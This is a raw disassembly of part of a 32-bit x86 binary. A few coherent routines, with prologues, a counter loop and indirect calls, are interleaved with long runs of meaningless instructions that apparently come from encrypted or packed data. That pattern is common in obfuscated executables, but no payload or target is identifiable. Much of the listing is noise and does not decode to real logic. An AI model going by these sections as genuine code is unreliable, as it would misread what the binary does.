  404a31:	add    DWORD PTR ds:0x42ec67,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x43035b
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	mov    ecx,ebp
  404a8d:	mov    esp,0x7e2547d7
  404a92:	jle    0x404a25
  404a94:	jl     0x404b14
  404a96:	jle    0x404a49
  404a98:	jmp    0x404a52
  404a9a:	cmp    BYTE PTR [esi-0x542bc2bf],bl
  404aa0:	mov    al,ds:0x5cfbf061
  404aa5:	stc    
  404aa6:	jb     0x404b26
  404aa8:	mov    DWORD PTR [ebx-0x52],eax
  404aab:	adc    edx,DWORD PTR [edx-0xd]
  404aae:	sti    
  404aaf:	dec    ecx
  404ab0:	call   0xed39:0x81ea03d7
  404ab7:	xchg   dh,al
  404ab9:	and    ebp,DWORD PTR [edi-0x88b7301]
  404abf:	mov    edx,0xbf8abee0
  404ac4:	out    dx,eax
  404ac5:	cmc    
  404ac6:	stos   BYTE PTR es:[edi],al
  404ac7:	mov    ch,0x41
  404ac9:	rcl    ebx,cl
  404acb:	dec    edx
  404acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404acd:	sub    ch,BYTE PTR [edx-0x7b]
  404ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ad1:	pop    ecx
  404ad2:	xchg   esp,eax
  404ad3:	es xor dl,ah
  404ad6:	push   cs
  404ad7:	pop    esp
  404ad8:	fnstsw WORD PTR [eax]
  404ada:	mov    edx,0x65ae4c74
  404adf:	iret   
  404ae0:	xchg   BYTE PTR [edx+0x7c],dh
  404ae3:	in     al,dx
  404ae4:	push   esi
  404ae5:	xchg   ecx,eax
  404ae6:	es dec edi
  404ae8:	push   ecx
  404ae9:	sar    DWORD PTR [edi],cl
  404aeb:	je     0x404b5b
  404aed:	rcl    DWORD PTR [ebx],0x68
  404af0:	xor    DWORD PTR [edi-0x75672dea],edx
  404af6:	push   ds
  404af7:	gs repz pushf 
  404afa:	mov    dh,BYTE PTR [edi]
  404afc:	into   
  404afd:	push   ebx
  404afe:	out    dx,eax
  404aff:	enter  0x7c2a,0x6c
  404b03:	jne    0x404aa1
  404b05:	cmp    eax,0x586a96ee
  404b0a:	(bad)  
  404b0b:	mov    dl,0x1
  404b0d:	(bad)  
  404b0e:	shl    edi,cl
  404b10:	jne    0x404b47
  404b12:	jmp    0x699f:0xf1031806
  404b19:	inc    ecx
  404b1a:	ret    
  404b1b:	ret    
  404b1c:	leave  
  404b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b1e:	mov    al,0xb3
  404b20:	loop   0x404b82
  404b22:	ret    
  404b23:	sbb    al,0x9c
  404b25:	sub    BYTE PTR [ecx-0x7b],cl
  404b28:	ja     0x404acb
  404b2a:	xchg   ebx,eax
  404b2b:	adc    eax,0x67591e85
  404b30:	sbb    bh,BYTE PTR [edx-0x63d692d7]
  404b36:	addr16 xor dl,ah
  404b39:	add    eax,0x83d18c70
  404b3e:	xchg   ebp,eax
  404b3f:	push   ebp
  404b40:	jae    0x404bbd
  404b42:	aas    
  404b43:	adc    al,0xba
  404b45:	mov    eax,0x6cea65dd
  404b4a:	shl    BYTE PTR [eax-0x75],cl
  404b4d:	dec    ecx
  404b4e:	push   es
  404b4f:	stos   BYTE PTR es:[edi],al
  404b50:	jmp    0xf3c86f04
  404b55:	pop    esi
  404b56:	mov    WORD PTR [edx+0x12],gs
  404b59:	lock adc DWORD PTR [esi+0x6bfe5451],ebp
  404b60:	mov    dl,ah
  404b62:	loope  0x404bd7
  404b64:	mov    ds:0xf5123643,al
  404b69:	fmul   QWORD PTR [eax]
  404b6b:	xor    edi,DWORD PTR [esi+0x6]
  404b6e:	adc    al,0xc0
  404b70:	pop    ebx
  404b71:	sub    DWORD PTR [ecx+0x6a007dda],esp
  404b77:	mov    WORD PTR [ebp+ecx*2-0x48],fs
  404b7b:	test   cl,dl
  404b7d:	jmp    0xbd769706
  404b82:	icebp  
  404b83:	das    
  404b84:	ficom  DWORD PTR [edi+0x63]
  404b87:	mov    bl,0xc
  404b89:	cdq    
  404b8a:	cs sbb cx,dx
  404b8e:	fisubr DWORD PTR [eax+0x5]
  404b91:	jae    0x404bae
  404b93:	sbb    eax,0x7a7ee409
  404b98:	inc    esi
  404b99:	xchg   esp,eax
  404b9a:	dec    edx
  404b9b:	fist   DWORD PTR [esi-0x57]
  404b9e:	aad    0xd1
  404ba0:	jmp    0xc06b:0x2dd32aa7
  404ba7:	scas   eax,DWORD PTR es:[di]
  404ba9:	cmp    BYTE PTR [ecx+ecx*4-0x54],ah
  404bad:	cli    
  404bae:	and    eax,0x67d26ac8
  404bb3:	lods   al,BYTE PTR ds:[esi]
  404bb4:	iret   
  404bb5:	mul    BYTE PTR [ecx+0x20]
  404bb8:	pop    es
  404bb9:	jns    0x404b95
  404bbb:	push   esi
  404bbc:	cmp    bh,0x5a
  404bbf:	shl    BYTE PTR [esi],cl
  404bc1:	pop    ds
  404bc2:	mov    ah,0xa4
  404bc4:	stos   DWORD PTR es:[edi],eax
  404bc5:	test   eax,0x848a236
  404bca:	addr16 xor dh,ah
  404bcd:	lods   al,BYTE PTR ds:[esi]
  404bce:	stos   DWORD PTR es:[edi],eax
  404bcf:	cdq    
  404bd0:	pop    ecx
  404bd1:	in     al,0x97
  404bd3:	std    
  404bd4:	ficom  DWORD PTR [edi+0xb1479c8]
  404bda:	aad    0xce
  404bdc:	or     ah,BYTE PTR [ebp-0x6c]
  404bdf:	adc    al,0xd1
  404be1:	aad    0xac
  404be3:	pop    eax
  404be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404be5:	test   eax,0x882b241b
  404bea:	out    0x65,al
  404bec:	iret   
  404bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bee:	scas   al,BYTE PTR es:[edi]
  404bef:	mov    eax,ds:0x3159360c
  404bf4:	push   ebx
  404bf5:	cmp    DWORD PTR [edx+0x5e],ecx
  404bf8:	mov    edx,DWORD PTR [esi-0xa]
  404bfb:	jae    0x404b8b
  404bfd:	les    esp,FWORD PTR [ecx-0x48]
  404c00:	inc    ebp
  404c01:	mov    ah,0xf6
  404c03:	cmp    ebp,DWORD PTR [ebp-0x2385bce]
  404c09:	js     0x404bd5
  404c0b:	dec    esp
  404c0c:	xchg   ebx,eax
  404c0d:	xor    DWORD PTR [edi-0x42a7736a],esi
  404c13:	out    0xc7,eax
  404c15:	jge    0x404bc6
  404c17:	gs push esi
  404c19:	mov    cl,0x86
  404c1b:	sbb    DWORD PTR [ecx+0x12],0x62020cea
  404c22:	scas   al,BYTE PTR es:[edi]
  404c23:	cmp    eax,0x58e90b77
  404c28:	adc    ebp,edx
  404c2a:	and    al,BYTE PTR [ebp+0x3faa1ffb]
  404c30:	xor    al,0x8a
  404c32:	mov    ebp,0xd8292203
  404c37:	cmp    cl,dh
  404c39:	pop    es
  404c3a:	js     0x404c33
  404c3c:	and    al,0x49
  404c3e:	push   ebp
  404c3f:	repz add cl,bl
  404c42:	jno    0x404c9e
  404c44:	loope  0x404bcc
  404c46:	rcl    BYTE PTR [esi-0x6f],1
  404c49:	retf   0xcd40
  404c4c:	cmovb  edi,DWORD PTR [edi]
  404c4f:	pop    ss
  404c50:	out    dx,al
  404c51:	icebp  
  404c52:	jp     0x404cbe
  404c54:	into   
  404c55:	popf   
  404c56:	mov    eax,es
  404c58:	sub    ecx,edx
  404c5a:	cmp    esi,0xffffff8c
  404c5d:	xchg   ecx,eax
  404c5e:	aad    0x38
  404c60:	add    bl,al
  404c62:	retf   
  404c63:	and    DWORD PTR [ebx],ebx
  404c65:	and    DWORD PTR [ebp+0x32],edx
  404c68:	and    al,0x44
  404c6a:	jecxz  0x404ca5
  404c6c:	mov    dh,0xe5
  404c6e:	xor    bh,bl
  404c70:	mov    esp,0xa041e11b
  404c75:	lahf   
  404c76:	outs   dx,BYTE PTR ds:[esi]
  404c77:	sub    ebp,DWORD PTR [eax+edi*2-0x452e07bc]
  404c7e:	jb     0x404c82
  404c80:	test   al,0xce
  404c82:	sub    eax,DWORD PTR [ebx+0x64ebf162]
  404c88:	add    eax,0xd1d106f
  404c8d:	shr    BYTE PTR [edx],1
  404c8f:	jae    0x404cd1
  404c91:	enter  0x2a7e,0x5f
  404c95:	mov    DWORD PTR [ebp+0x1b],0xe43f107c
  404c9c:	inc    ebx
  404c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c9e:	loope  0x404ce9
  404ca0:	sub    dl,ch
  404ca2:	add    ecx,esp
  404ca4:	pop    edx
  404ca5:	clc    
  404ca6:	popf   
  404ca7:	inc    eax
  404ca8:	jb     0x404c43
  404caa:	and    edi,DWORD PTR [esi]
  404cac:	add    ebx,edi
  404cae:	fcomp  QWORD PTR [esi-0x25]
  404cb1:	inc    ecx
  404cb2:	inc    ebx
  404cb3:	sbb    ch,bl
  404cb5:	xchg   BYTE PTR [edx],dl
  404cb7:	xchg   ebp,eax
  404cb8:	fs (bad) 
  404cba:	fst    QWORD PTR [edi]
  404cbc:	aad    0xa9
  404cbe:	jle    0x404c70
  404cc0:	call   0x46986120
  404cc5:	mov    esp,0x5f154a20
  404cca:	inc    esp
  404ccb:	push   ss
  404ccc:	fnsave [eax]
  404cce:	jbe    0x404cfa
  404cd0:	pop    ebp
  404cd1:	outs   dx,BYTE PTR ds:[esi]
  404cd2:	mov    bh,0x4a
  404cd4:	and    dl,BYTE PTR [edx+0x2]
  404cd7:	sub    dl,BYTE PTR [ebx]
  404cd9:	pop    ebp
  404cda:	mov    edi,0x4cdc43bb
  404cdf:	pop    ebx
  404ce0:	mov    eax,ds:0x6e8ff767
  404ce5:	fidiv  WORD PTR [edi+0x5dd1229c]
  404ceb:	stc    
  404cec:	cmp    BYTE PTR [edi],ah
  404cee:	or     al,0xb9
  404cf0:	nop
  404cf1:	sti    
  404cf2:	push   edx
  404cf3:	dec    ebp
  404cf4:	stc    
  404cf5:	das    
  404cf6:	mov    ecx,0x5fe376ac
  404cfb:	mov    al,0xdf
  404cfd:	and    DWORD PTR [ecx-0x31],ebx
  404d00:	imul   eax,DWORD PTR [edi],0xc4676d85
  404d06:	rcr    DWORD PTR [ecx+0x60f3844],0x60
  404d0d:	ss dec eax
  404d0f:	and    ecx,esp
  404d11:	int    0x37
  404d13:	and    eax,0xeead8229
  404d18:	ret    0x7a54
  404d1b:	or     BYTE PTR [esi+0x2d606d5],dh
  404d21:	inc    esp
  404d22:	jne    0x404cb7
  404d24:	inc    ebx
  404d25:	mov    ecx,0xca0ac54e
  404d2a:	mov    dl,0x35
  404d2c:	aam    0xb8
  404d2e:	ror    DWORD PTR [edi+ebp*4-0x27198c7a],1
  404d35:	sub    esi,edi
  404d37:	icebp  
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x779b3fa9
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404da4
  404d6a:	jo     0x404d4c
  404d6c:	sub    BYTE PTR [edx],0xff
  404d6f:	sub    al,0x16
  404d71:	mov    ebp,DWORD PTR [ebx-0x3b]
  404d74:	and    ecx,eax
  404d76:	or     ebp,0xd658c12a
  404d7c:	and    eax,0xb909d395
  404d81:	push   0x6f93b4e1
  404d86:	(bad)  
  404d87:	clc    
  404d88:	out    0xd3,al
  404d8a:	and    BYTE PTR [eax-0x39438636],0x2d
  404d91:	inc    edi
  404d92:	cmovbe ebx,ebx
  404d95:	xchg   ecx,eax
  404d96:	out    0xe0,eax
  404d98:	xchg   ebp,eax
  404d99:	addr16 jl 0x404d2a
  404d9c:	add    eax,0xdedbaa59
  404da1:	sar    DWORD PTR [esi*8+0x7f4996e],cl
  404da8:	xchg   edx,eax
  404da9:	mov    ch,0xf7
  404dab:	ror    DWORD PTR [esi-0x55],cl
  404dae:	sbb    dl,0x1a
  404db1:	and    al,0xdf
  404db3:	lods   al,BYTE PTR ds:[esi]
  404db4:	xlat   BYTE PTR ds:[ebx]
  404db5:	xor    eax,0x324b1bec
  404dba:	mov    al,ds:0x48f55b58
  404dbf:	cwde   
  404dc0:	adc    al,0x30
  404dc2:	(bad)  
  404dc3:	in     al,dx
  404dc4:	fiadd  WORD PTR [edx+esi*1+0x32]
  404dc8:	mov    bh,0x33
  404dca:	daa    
  404dcb:	jae    0x404dd4
  404dcd:	jge    0x404e0a
  404dcf:	ins    DWORD PTR es:[edi],dx
  404dd0:	adc    eax,0x58c94326
  404dd5:	bound  esi,QWORD PTR [ebx-0x6fa5517e]
  404ddb:	aam    0x99
  404ddd:	shr    dh,0x75
  404de0:	dec    edi
  404de1:	retf   
  404de2:	scas   al,BYTE PTR es:[edi]
  404de3:	div    BYTE PTR [ecx-0x4b]
  404de6:	not    BYTE PTR [edi-0x47]
  404de9:	test   DWORD PTR [esi+eax*1-0xb],esi
  404ded:	imul   edi,DWORD PTR ds:0xae1d6b7c,0x37b78c1a
  404df7:	pushf  
  404df8:	inc    ecx
  404df9:	frstor [edx+0x75d92616]
  404dff:	push   ebx
  404e00:	push   esp
  404e01:	pop    es
  404e02:	adc    edx,DWORD PTR [esi-0x45aa709e]
  404e08:	scas   al,BYTE PTR es:[edi]
  404e09:	cmpxchg DWORD PTR [edi],ebp
  404e0c:	dec    esp
  404e0d:	push   esi
  404e0e:	ret    0x5bf7
  404e11:	dec    ebp
  404e12:	loope  0x404e50
  404e14:	push   esi
  404e15:	mov    esi,0x5ce87c60
  404e1a:	dec    ebx
  404e1b:	sti    
  404e1c:	push   es
  404e1d:	leave  
  404e1e:	add    dh,BYTE PTR [ecx-0x462d314a]
  404e24:	xchg   ebp,eax
  404e25:	out    dx,eax
  404e26:	aam    0x23
  404e28:	lods   eax,DWORD PTR ds:[esi]
  404e29:	jnp    0x404e9d
  404e2b:	cmp    ebx,0xffffff8f
  404e2e:	adc    cl,BYTE PTR [edx+0x4b6a8141]
  404e34:	sbb    DWORD PTR [esp+ebx*2],esi
  404e37:	mov    ebx,0x14f28220
  404e3c:	adc    esp,ebx
  404e3e:	cli    
  404e3f:	sbb    eax,0xce70e3c3
  404e44:	mov    DWORD PTR [edx],edi
  404e46:	or     eax,DWORD PTR ds:0x1e163c2
  404e4c:	(bad)  
  404e4d:	cmp    ebp,esp
  404e4f:	out    0xda,al
  404e51:	imul   ebx,DWORD PTR [eax+0x2e],0x5fde533d
  404e58:	cmc    
  404e59:	fwait
  404e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e5b:	inc    edx
  404e5c:	arpl   WORD PTR [ebp+0x23f71aba],si
  404e62:	mov    sp,0x7e8c
  404e66:	pop    esi
  404e67:	jae    0x404e49
  404e69:	in     al,0x9e
  404e6b:	es dec edi
  404e6d:	je     0x404e5b
  404e6f:	xchg   ebp,eax
  404e70:	push   DWORD PTR [ecx+0x2cdffe0]
  404e76:	dec    esi
  404e77:	adc    BYTE PTR [esi+0x1],0x8b
  404e7b:	int    0x38
  404e7d:	cmp    BYTE PTR [ecx],bl
  404e7f:	dec    esi
  404e80:	mov    ebx,0xcac33ae3
  404e85:	inc    eax
  404e86:	xor    ecx,DWORD PTR [esp+edx*1+0x657a2df9]
  404e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e8e:	sbb    cl,BYTE PTR [edx+edx*1]
  404e91:	aas    
  404e92:	enter  0x5826,0x56
  404e96:	minps  xmm1,XMMWORD PTR [edx]
  404e99:	or     BYTE PTR [ebx],bh
  404e9b:	pusha  
  404e9c:	cmp    ebp,DWORD PTR [esi+0x7f1d47a3]
  404ea2:	jae    0x404ef4
  404ea4:	bound  ecx,QWORD PTR [edi]
  404ea6:	neg    ebx
  404ea8:	out    0x2,al
  404eaa:	mov    ebx,0xe1824e5a
  404eaf:	out    dx,eax
  404eb0:	and    ch,BYTE PTR [esi+ebp*2]
  404eb3:	cmp    al,0x93
  404eb5:	add    al,al
  404eb7:	stos   BYTE PTR es:[edi],al
  404eb8:	dec    ebp
  404eb9:	jb     0x404e66
  404ebb:	mov    ds:0xbcd849c1,eax
  404ec0:	mov    eax,ds:0xd4fd27fc
  404ec5:	push   eax
  404ec6:	sbb    al,0xa0
  404ec8:	xchg   DWORD PTR [esi],edi
  404eca:	xchg   edi,edx
  404ecc:	push   ecx
  404ecd:	jmp    edx
  404ecf:	fwait
  404ed0:	sbb    dh,BYTE PTR ds:0x6abe4eef
  404ed6:	dec    edi
  404ed7:	jmp    0x77f2ce0c
  404edc:	add    bl,BYTE PTR [ecx+0x60]
  404edf:	xor    DWORD PTR [edx+0x4a],edx
  404ee2:	inc    edi
  404ee3:	add    esi,ecx
  404ee5:	jo     0x404eb9
  404ee7:	shr    DWORD PTR [ebp+0x60bca520],1
  404eed:	test   BYTE PTR [ecx-0x6f933fd],bl
  404ef3:	repnz add BYTE PTR [edx-0x4d],0x44
  404ef8:	out    0xc4,al
  404efa:	cmp    al,0x25
  404efc:	push   edx
  404efd:	cmp    al,0xd8
  404eff:	lock mov ebp,0xd39c3744
  404f05:	add    DWORD PTR [ecx+ecx*2],ecx
  404f08:	add    BYTE PTR [ebp-0x5de22205],dh
  404f0e:	cmp    eax,0xc64fe5cb
  404f13:	push   ebp
  404f14:	imul   ecx,DWORD PTR [eax],0xffffffe7
  404f17:	and    edx,eax
  404f19:	push   eax
  404f1a:	bound  ebp,QWORD PTR [ebx]
  404f1c:	sar    bh,cl
  404f1e:	mov    DWORD PTR [esi],ebx
  404f20:	dec    eax
  404f21:	(bad)  
  404f22:	sub    dl,cl
  404f24:	and    al,0xce
  404f26:	shr    BYTE PTR [edi+0x4c],1
  404f29:	adc    eax,0x4532d40e
  404f2e:	mov    ebx,esi
  404f30:	jns    0x404f53
  404f32:	cli    
  404f33:	mov    ebx,0x10ef13fc
  404f38:	fdiv   QWORD PTR [edx+0x33]
  404f3b:	mov    al,0x6e
  404f3d:	mov    edi,edx
  404f3f:	mov    edx,0x756f528d
  404f44:	ret    0x8c27
  404f47:	outs   dx,BYTE PTR ds:[esi]
  404f48:	jg     0x404ede
  404f4a:	push   ebp
  404f4b:	iret   
  404f4c:	cmc    
  404f4d:	pop    ebx
  404f4e:	dec    esi
  404f4f:	shr    DWORD PTR [ebp+0x1a],1
  404f52:	pop    esp
  404f53:	sub    esp,DWORD PTR [ebx]
  404f55:	sbb    ecx,DWORD PTR [ebp-0x4]
  404f58:	sub    eax,0xd9258151
  404f5d:	add    al,BYTE PTR [ebx+0x0]
  404f60:	add    BYTE PTR [eax],al
  404f62:	add    BYTE PTR [eax],al
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	clc    
  405053:	bound  esi,QWORD PTR [edi+esi*4]
  405056:	(bad)  
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x4050cf
  40505f:	jnp    0x405002
  405061:	imul   edi,DWORD PTR [ecx+0x4a],0x62
  405065:	rcl    BYTE PTR [eax-0xce3f571],1
  40506b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40506c:	and    eax,0xede45c60
  405071:	xchg   esp,eax
  405072:	push   ebx
  405073:	adc    BYTE PTR [edx+0x545a2efb],cl
  405079:	(bad)  
  40507a:	punpckhbw mm1,QWORD PTR [edx+ebp*1]
  40507e:	aad    0x84
  405080:	mov    ebp,0x9606ac5a
  405085:	adc    eax,0xfcfdc5d2
  40508a:	push   ebp
  40508b:	aad    0x89
  40508d:	shl    DWORD PTR [eax],cl
  40508f:	stos   DWORD PTR es:[edi],eax
  405090:	pushf  
  405091:	push   ebp
  405092:	xor    bh,BYTE PTR [eax+eiz*2]
  405095:	stos   BYTE PTR es:[edi],al
  405096:	inc    ebx
  405097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405098:	shr    BYTE PTR [esi+eax*2-0x73],1
  40509c:	dec    esi
  40509d:	repnz out 0xf1,al
  4050a0:	xchg   esi,eax
  4050a1:	imul   ebp,DWORD PTR [esi],0x4f3d0a63
  4050a7:	cmp    eax,0xf12e907d
  4050ac:	int3   
  4050ad:	pop    edi
  4050ae:	aad    0x51
  4050b0:	inc    eax
  4050b1:	push   0xfdb2e6de
  4050b6:	or     BYTE PTR [esp+eax*2-0x4f],ah
  4050ba:	push   ebx
  4050bb:	push   ss
  4050bc:	in     al,dx
  4050bd:	jle    0x40506f
  4050bf:	sbb    ebx,DWORD PTR [esi+0x36b34242]
  4050c5:	cmp    al,0xfe
  4050c7:	and    ebx,DWORD PTR [esi-0x8f5e421]
  4050cd:	sub    cl,0xd1
  4050d0:	pop    ds
  4050d1:	int    0x30
  4050d3:	pop    ss
  4050d4:	je     0x4050bf
  4050d6:	jmp    0xd2099439
  4050db:	mov    ebx,0xba704987
  4050e0:	xor    ebp,DWORD PTR [edx-0x3b60faeb]
  4050e6:	call   0xd5fdc143
  4050eb:	jnp    0x4050ae
  4050ed:	jne    0x405077
  4050ef:	repz jp 0x4050c2
  4050f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050f3:	cmp    dh,bh
  4050f5:	retf   0x3c9d
  4050f8:	retf   0xc6fe
  4050fb:	div    DWORD PTR [ebx+0x4d533815]
  405101:	sbb    al,0xa7
  405103:	dec    esi
  405104:	das    
  405105:	add    dl,bl
  405107:	test   BYTE PTR [esi-0x7349910c],dh
  40510d:	fbstp  TBYTE PTR [esi+ebx*8]
  405110:	(bad)  
  405111:	push   esi
  405112:	add    DWORD PTR [eax],ebp
  405114:	call   FWORD PTR [esi]
  405116:	cmp    dl,dh
  405118:	inc    edx
  405119:	lahf   
  40511a:	hlt    
  40511b:	stos   BYTE PTR es:[edi],al
  40511c:	mov    ebx,0xb4a5e710
  405121:	mov    ah,cl
  405123:	push   ecx
  405124:	xor    DWORD PTR [edx+0x26],ebx
  405127:	adc    BYTE PTR [edx],ah
  405129:	cmp    eax,0x9b3f18c9
  40512e:	sar    DWORD PTR [edx-0x7b],1
  405131:	or     dl,BYTE PTR [esi]
  405133:	pop    esp
  405134:	cmp    DWORD PTR [edx+0x59c68ea3],esp
  40513a:	(bad)  
  40513b:	pop    DWORD PTR [ebx]
  40513d:	dec    edi
  40513e:	mov    es,WORD PTR [edi+0x52]
  405141:	and    esp,eax
  405143:	cmp    DWORD PTR [ebx-0x2ef40488],esp
  405149:	pop    edx
  40514a:	(bad)
  40514d:	out    0x62,eax
  40514f:	outs   dx,BYTE PTR ds:[esi]
  405150:	jmp    0x40518e
  405152:	int    0x19
  405154:	adc    DWORD PTR [eax-0x69810790],edx
  40515a:	pop    ebp
  40515b:	jne    0x4051a3
  40515d:	inc    edx
  40515e:	arpl   WORD PTR [ecx],ax
  405160:	mov    al,ds:0x9f95f8f3
  405165:	leave  
  405166:	mov    edx,0x3bc13729
  40516b:	mov    ecx,0x9fe2d70d
  405170:	and    BYTE PTR [eax-0x74],0x5f
  405174:	inc    edx
  405175:	cmp    edx,esp
  405177:	inc    edx
  405178:	(bad)  
  405179:	scas   al,BYTE PTR es:[edi]
  40517a:	inc    eax
  40517b:	mov    edx,0x9ec734d9
  405180:	mov    bh,0x51
  405182:	pop    eax
  405183:	pop    ecx
  405184:	arpl   WORD PTR [ebx+0x4c],bx
  405187:	fiadd  WORD PTR [edx]
  405189:	lods   eax,DWORD PTR ds:[esi]
  40518a:	jb     0x40516c
  40518c:	jmp    0x4051d5
  40518e:	mov    BYTE PTR [ebp+0x11],dl
  405191:	ret    0x2d3f
  405194:	mov    ss,WORD PTR [esi+ecx*2-0x7c]
  405198:	pop    esi
  405199:	add    ch,BYTE PTR ds:0xab1b0a37
  40519f:	jb     0x40520b
  4051a1:	out    dx,al
  4051a2:	push   ds
  4051a3:	and    bh,cl
  4051a5:	int3   
  4051a6:	clc    
  4051a7:	inc    eax
  4051a8:	lds    esi,FWORD PTR [edi]
  4051aa:	(bad)  [eax]
  4051ac:	inc    esp
  4051ad:	lods   al,BYTE PTR ds:[esi]
  4051ae:	ret    0xf324
  4051b1:	retf   0x1c9
  4051b4:	call   0x1e6f:0x3d1a30c
  4051bb:	jl     0x405162
  4051bd:	cwde   
  4051be:	std    
  4051bf:	jmp    0xb39:0x5525b4a7
  4051c6:	mov    bl,0x56
  4051c8:	inc    edi
  4051c9:	pop    ecx
  4051ca:	push   0xffffffb5
  4051cc:	in     eax,dx
  4051cd:	nop
  4051ce:	or     al,0x24
  4051d0:	pop    ecx
  4051d1:	std    
  4051d2:	sub    edi,esi
  4051d4:	in     al,0x35
  4051d6:	sub    eax,0x9f7a2686
  4051db:	mov    edx,0xadf5a65c
  4051e0:	mov    ds:0xd7e66cd8,al
  4051e5:	pop    eax
  4051e6:	fld    DWORD PTR [ebx-0x563bc046]
  4051ec:	jecxz  0x4051c4
  4051ee:	sahf   
  4051ef:	in     al,dx
  4051f0:	sbb    al,0xc0
  4051f2:	popf   
  4051f3:	daa    
  4051f4:	lea    eax,[edi+edx*2]
  4051f7:	es pop ebp
  4051f9:	pop    ebx
  4051fa:	sub    DWORD PTR [eax],ecx
  4051fc:	mov    eax,ds:0x1c4e5d9f
  405201:	sbb    eax,0x4707d6fb
  405206:	scas   eax,DWORD PTR es:[edi]
  405207:	jnp    0x40526b
  405209:	retf   0xb527
  40520c:	call   0x5ef3:0x39064028
  405213:	sbb    BYTE PTR [ebx],al
  405215:	sahf   
  405216:	fadd   QWORD PTR [ebp-0x66eb9f6]
  40521c:	jno    0x405289
  40521e:	test   DWORD PTR [ebx],esi
  405220:	mov    edi,0x6e103e41
  405225:	call   0xf84a:0x35167731
  40522c:	bound  edx,QWORD PTR [ecx-0x3139b385]
  405232:	int3   
  405233:	pop    esp
